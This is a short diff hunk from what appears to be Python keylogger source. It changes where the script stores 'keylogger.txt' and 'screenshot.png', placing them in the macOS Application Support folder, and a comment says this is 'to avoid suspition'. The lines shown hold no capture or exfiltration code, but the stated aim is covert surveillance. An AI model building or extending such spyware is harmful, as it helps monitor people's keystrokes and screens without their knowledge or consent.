@@ -7,7 +7,7 @@ import platform
 from pathlib import Path
 
 home = str(Path.home())
-filepath = home + '/Library/Application Support/Your App name' #Keeping the files here to avoid suspition
+filepath = home + '/Library/Application Support/' #Keeping the files here to avoid suspition
 keylog = 'keylogger.txt'
 scrshot = 'screenshot.png'
 count = 0
